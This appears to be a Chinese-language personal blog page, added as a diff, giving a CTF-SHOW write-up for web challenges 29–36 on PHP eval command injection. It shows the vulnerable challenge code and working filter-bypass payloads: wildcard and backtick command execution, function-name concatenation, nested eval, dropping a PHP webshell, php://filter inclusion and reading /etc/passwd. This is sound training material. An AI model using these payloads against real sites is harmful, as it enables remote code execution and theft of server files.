@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"pocon041.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="CTF SHOW web29~124  Web29题目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-SHOW刷题记录Web3">
+<meta property="og:url" content="https://pocon041.github.io/2025/03/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="Pocon">
+<meta property="og:description" content="CTF SHOW web29~124  Web29题目">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312150246343.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312151309809.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312153231369.png">
+<meta property="article:published_time" content="2025-03-18T08:23:07.000Z">
+<meta property="article:modified_time" content="2025-03-18T08:23:07.000Z">
+<meta property="article:author" content="Pocon">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250312150246343.png">
+
+<link rel="canonical" href="https://pocon041.github.io/2025/03/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CTF-SHOW刷题记录Web3 | Pocon</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --></head>
+
+<body class=" post-shell" itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pocon</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-blog">
+
+    <a href="/blog/" rel="section"><i class="fa fa-pencil-alt fa-fw"></i>Blog</a>
+
+  </li>
+        <li class="menu-item menu-item-projects">
+
+    <a href="/#projects" rel="section"><i class="fa fa-code fa-fw"></i>Projects</a>
+
+  </li>
+        <li class="menu-item menu-item-music">
+
+    <a href="/music/" rel="section"><i class="fa fa-music fa-fw"></i>Music</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+  <nav class="post-topbar" aria-label="Post navigation">
+  <a class="post-brand" href="/">Pocon</a>
+  <div>
+    <a href="/">Home</a>
+    <a href="/about/">About</a>
+    <a href="/blog/">Blog</a>
+    <a href="/archives/">Archive</a>
+    <a href="/categories/">Categories</a>
+    <a href="/tags/">Tags</a>
+    <a href="/gallery/">Gallery</a>
+    <a href="/music/">Music</a>
+  </div>
+</nav>
+
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block has-post-cover" style="--post-cover-image: url('/images/post-covers/133825160_p0_master1200.jpg'); --post-cover-overlay: linear-gradient(90deg, rgba(255, 255, 255, 0.86) 0%, rgba(255, 255, 255, 0.74) 52%, rgba(255, 255, 255, 0.58) 100%); --post-cover-position: center; --post-cover-size: cover; --post-cover-repeat: no-repeat; --post-cover-blend-mode: normal" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://pocon041.github.io/2025/03/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Pocon">
+      <meta itemprop="description" content="Pocon's personal blog about Computer Vision, CTF, Multimedia Forensics, Web Security, Pwn and Machine Learning.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pocon">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTF-SHOW刷题记录Web3
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-03-18 16:23:07" itemprop="dateCreated datePublished" datetime="2025-03-18T16:23:07+08:00">2025-03-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/" itemprop="url" rel="index"><span itemprop="name">计算机</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="CTF-SHOW"><a href="#CTF-SHOW" class="headerlink" title="CTF SHOW"></a>CTF SHOW</h1><blockquote>
+<p>web29~124</p>
+</blockquote>
+<h2 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="前置基础知识"><a href="#前置基础知识" class="headerlink" title="前置基础知识"></a>前置基础知识</h3><h5 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h5><p>eval()函数<font color="red">把字符串按照PHP代码来计算</font>。该字符串必须是合法的PHP代码，且必须以分号结尾。</p>
+<blockquote>
+<p>return语句会立即种植对字符串的计算</p>
+</blockquote>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(phpcode)</span><br></pre></td></tr></tbody></table></figure>
+<p>phpcode：必需。规定要计算的PHP代码</p>
+<h5 id="system函数"><a href="#system函数" class="headerlink" title="system函数"></a>system函数</h5><p>同C版本的system()函数一样</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$result_code</span> = <span class="literal">null</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></tbody></table></figure>
+<p>command：必需。要执行的命令</p>
+<p>result_code：可选。如果提供result_code参数，则外部命令执行后的返回状态将会被设置到此变量中</p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>需要输入一个c，c不能包含flag（无论大小写）</p>
+<p>即c是读取flag.php的代码，需要绕过flag字符串匹配</p>
+<h3 id="几种思路"><a href="#几种思路" class="headerlink" title="几种思路"></a>几种思路</h3><p>一开始使用 <code>ls</code> 命令查看目录，得知flag就在flag.php文件中</p>
+<ol>
+<li><h5 id="用egrep。egrep-grep-E"><a href="#用egrep。egrep-grep-E" class="headerlink" title="用egrep。egrep = grep -E"></a>用egrep。egrep = grep -E</h5></li>
+</ol>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">system</span>(<span class="string">"cat fl*g.php | grep -E 'fl.g' "</span>);</span><br></pre></td></tr></tbody></table></figure>
+<blockquote>
+<p>正则表达式</p>
+<p>BASH：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/phillee/p/10949796.html">https://www.cnblogs.com/phillee/p/10949796.html</a></p>
+<p>重定向</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/shell-scripting.html">https://www.runoob.com/w3cnote/shell-scripting.html</a></p>
+<p>grep命令用汉语查找文件里符合条件的字符串或正则表达式</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-grep.html">https://www.runoob.com/linux/linux-comm-grep.html</a></p>
+<p>grep [options] pattern [files]</p>
+<p>pattern：表示要查找的字符串或正则表达式</p>
+<p>files：表示要查找的文件名，可以多个。默认标准输入</p>
+<p>option：</p>
+<ul>
+<li><code>-i</code>：忽略大小写进行匹配。</li>
+<li><code>-v</code>：反向查找，只打印不匹配的行。</li>
+<li><code>-n</code>：显示匹配行的行号。</li>
+<li><code>-r</code>：递归查找子目录中的文件。</li>
+<li><code>-l</code>：只打印匹配的文件名。</li>
+<li><code>-c</code>：只打印匹配的行数。</li>
+</ul>
+</blockquote>
+<ol>
+<li><h5 id="直接cat（使用通配符绕过，但无回显，需要查看源码）"><a href="#直接cat（使用通配符绕过，但无回显，需要查看源码）" class="headerlink" title="直接cat（使用通配符绕过，但无回显，需要查看源码）"></a>直接cat（使用通配符绕过，但无回显，需要查看源码）</h5></li>
+</ol>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">system</span>(<span class="string">"cat fl*g.php"</span>);</span><br></pre></td></tr></tbody></table></figure>
+<p>但要查看网页源代码</p>
+<ol>
+<li><h5 id="倒序输出（使用通配符绕过，但有回显）"><a href="#倒序输出（使用通配符绕过，但有回显）" class="headerlink" title="倒序输出（使用通配符绕过，但有回显）"></a>倒序输出（使用通配符绕过，但有回显）</h5></li>
+</ol>
+<p>并不是说每个词序是反的，而是说文件内容从最后一行开始显示</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">system</span>(<span class="string">"tac fl*g.php"</span>);</span><br></pre></td></tr></tbody></table></figure>
+<ol>
+<li><h5 id="复制到另一个文件中，再查看另一个文件"><a href="#复制到另一个文件中，再查看另一个文件" class="headerlink" title="复制到另一个文件中，再查看另一个文件"></a>复制到另一个文件中，再查看另一个文件</h5></li>
+</ol>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">system</span>(<span class="string">"cp fl*g.php a.txt"</span>);</span><br></pre></td></tr></tbody></table></figure>
+<p>需要访问<code>/a.txt</code></p>
+<ol>
+<li><h5 id="直接输出一个php，这样就可以不需要绕过了"><a href="#直接输出一个php，这样就可以不需要绕过了" class="headerlink" title="直接输出一个php，这样就可以不需要绕过了"></a>直接输出一个php，这样就可以不需要绕过了</h5></li>
+</ol>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">system</span>(<span class="string">'echo -e " &lt;?php \n error_reporting(0); \n  \$c= \$_GET[\'c\']; \n eval(\$c); " &gt; a.php'</span>);</span><br><span class="line"></span><br><span class="line">/a.php?c=<span class="title function_ invoke__">system</span>(<span class="string">"tac flag.php"</span>);</span><br></pre></td></tr></tbody></table></figure>
+<ol>
+<li><h5 id="显示文件命令配合base64编码"><a href="#显示文件命令配合base64编码" class="headerlink" title="显示文件命令配合base64编码"></a>显示文件命令配合base64编码</h5></li>
+</ol>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">"ZmxhZy5waHA="</span>));</span><br></pre></td></tr></tbody></table></figure>
+<blockquote>
+<p>highlight_file(filename, return)</p>
+<p>filename：必需。规定要显示的文件</p>
+<p>return：可选。如果该参数设置为TRUE，该函数将以字符串形式返回高亮显示的代码。默认是FALSE。</p>
+</blockquote>
+<h2 id="Web30"><a href="#Web30" class="headerlink" title="Web30"></a>Web30</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|system|php/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这里绕过了<code>flag</code>，<code>system</code>和<code>php</code>、</p>
+<h3 id="几种思路-1"><a href="#几种思路-1" class="headerlink" title="几种思路"></a>几种思路</h3><ol>
+<li><h5 id="使用passthur绕过system，使用-代替单个字符（实测不行）"><a href="#使用passthur绕过system，使用-代替单个字符（实测不行）" class="headerlink" title="使用passthur绕过system，使用 ? 代替单个字符（实测不行）"></a><del>使用<code>passthur</code>绕过<code>system</code>，使用 <code>?</code> 代替单个字符</del>（实测不行）</h5></li>
+</ol>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">passthur</span>(<span class="string">"tac fla*"</span>);</span><br></pre></td></tr></tbody></table></figure>
+<blockquote>
+<p>通配符</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ysuwangqiang/p/11364173.html">https://www.cnblogs.com/ysuwangqiang/p/11364173.html</a></p>
+<p>？ 和  * 的区别</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30252651/article/details/115853196">https://blog.csdn.net/weixin_30252651/article/details/115853196</a></p>
+<p>更多绕过system的方法</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.cn/faq/298828.html">https://www.php.cn/faq/298828.html</a></p>
+</blockquote>
+<ol>
+<li><h5 id="使用打印文件命令（反字节符配合echo）"><a href="#使用打印文件命令（反字节符配合echo）" class="headerlink" title="使用打印文件命令（反字节符配合echo）"></a>使用打印文件命令（反字节符配合echo）</h5></li>
+</ol>
+<p>也称为，使用反引号代替system函数起到命令执行的效果</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> `nl fl<span class="string">''</span>ag.p<span class="string">''</span>hp`;</span><br><span class="line"><span class="keyword">echo</span> `cat fl<span class="string">''</span>ag.p<span class="string">''</span>hp`;</span><br><span class="line"><span class="keyword">echo</span> `cat fl*ag.p*hp`;	<span class="comment">#这条最佳</span></span><br><span class="line"><span class="keyword">echo</span> `cp fl*ag.p*hp <span class="number">1</span>.txt | cat <span class="number">1</span>.txt`;</span><br></pre></td></tr></tbody></table></figure>
+<ol>
+<li><h5 id="拼接法（感觉不如eval嵌套）"><a href="#拼接法（感觉不如eval嵌套）" class="headerlink" title="拼接法（感觉不如eval嵌套）"></a>拼接法（感觉不如eval嵌套）</h5></li>
+</ol>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="variable">$a</span>=sys;<span class="variable">$b</span>=tem;<span class="variable">$d</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$d</span>(<span class="string">"tac fl*"</span>);</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="Web31"><a href="#Web31" class="headerlink" title="Web31"></a>Web31</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>过滤了：<code>flag</code>，<code>system</code>，<code>php</code>，<code>cat</code>，<code>sort</code>，<code>shell</code>，<code>.</code>，<code>‘</code></p>
+<h3 id="几种思路-2"><a href="#几种思路-2" class="headerlink" title="几种思路"></a>几种思路</h3><ol>
+<li><h5 id="使用eval嵌套"><a href="#使用eval嵌套" class="headerlink" title="使用eval嵌套"></a>使用eval嵌套</h5></li>
+</ol>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[a]);&amp;a=<span class="title function_ invoke__">system</span>(<span class="string">'cat flag.php'</span>);</span><br></pre></td></tr></tbody></table></figure>
+<p>这个payload共传递了两个参数，第一个为嵌套eval，第二个为嵌套eval的传入参数</p>
+<ol>
+<li><h5 id="其他函数凑出所需要的字符串来绕过（盐都不盐了）"><a href="#其他函数凑出所需要的字符串来绕过（盐都不盐了）" class="headerlink" title="其他函数凑出所需要的字符串来绕过（盐都不盐了）"></a>其他函数凑出所需要的字符串来绕过（盐都不盐了）</h5></li>
+</ol>
+<p>其实这个是rce</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">localeconv</span>()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个<span class="string">"."</span></span><br><span class="line"><span class="title function_ invoke__">pos</span>():输出数组第一个元素，不改变指针；</span><br><span class="line"><span class="title function_ invoke__">scandir</span>();遍历目录，这里因为参数为<span class="string">"."</span>所以遍历当前目录</span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>():元组倒置</span><br><span class="line"><span class="title function_ invoke__">next</span>():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[<span class="number">2</span>]取出数组也可以</span><br><span class="line"><span class="title function_ invoke__">show_source</span>():查看源码</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="Web32"><a href="#Web32" class="headerlink" title="Web32"></a>Web32</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">}<span class="keyword">else</span>{  </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>过滤：<code>flag</code>，<code>system</code>，<code>php</code>，<code>cat</code>，<code>sort</code>，<code>shell</code>，<code>.</code> ，<code>‘</code> ，`  ，<code>echo</code>，；，(</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>参照sdellone的wp，进行了改进和解释</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>%<span class="number">0</span>a<span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php #这是sdellone的payload</span></span><br><span class="line"></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php #这是我的payload</span></span><br></pre></td></tr></tbody></table></figure>
+<p>其实两者的差距只在于一个%0a，改不改无所谓，下面解释各成分作用</p>
+<ul>
+<li>首先是include+参数1，作用是包含参数1的文件，运用了文件包含漏洞，最后的文件名字可以改为/etc/passwd和nginx的日志文件来定位flag位置</li>
+<li>然后是%0a作用，这是url回车符，因为空格被过滤。事实上，删去也无所谓，似乎php会自动给字符串和变量间添加空格（经检验，只在eval中有效，echo中无效，还是得要空格）</li>
+<li>后面的?&gt;的作用是作为绕过分号，作为语句的结束。原理是：php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?&gt;前可以不写分号。</li>
+<li><p>在c中引用了参数1，然后&amp;后对参数1定义，运用文件包含漏洞</p>
+<p>还可以使用<strong>data伪协议</strong>，<strong>日志注入</strong></p>
+</li>
+</ul>
+<h2 id="Web33"><a href="#Web33" class="headerlink" title="Web33"></a>Web33</h2><p>比起上道题多过滤了 <code>“</code></p>
+<p>使用文件包含漏洞一样的</p>
+<h2 id="Web34"><a href="#Web34" class="headerlink" title="Web34"></a>Web34</h2><p>比起上道题多过滤了 <code>:</code></p>
+<p>检查的内容只有<code>c</code>，而<code>c</code>在<code>?&gt;</code>已经闭合了，不影响后续的<code>1</code></p>
+<h2 id="Web35"><a href="#Web35" class="headerlink" title="Web35"></a>Web35</h2><p>比起上道题多过滤了 <code>&lt;</code>, <code>=</code></p>
+<p>还是一样的</p>
+<h2 id="Web36"><a href="#Web36" class="headerlink" title="Web36"></a>Web36</h2><p>比起上到题多过滤了<code>/</code>，<code>[0-9]</code></p>
+<p>那需要修改一下传入的文件名</p>
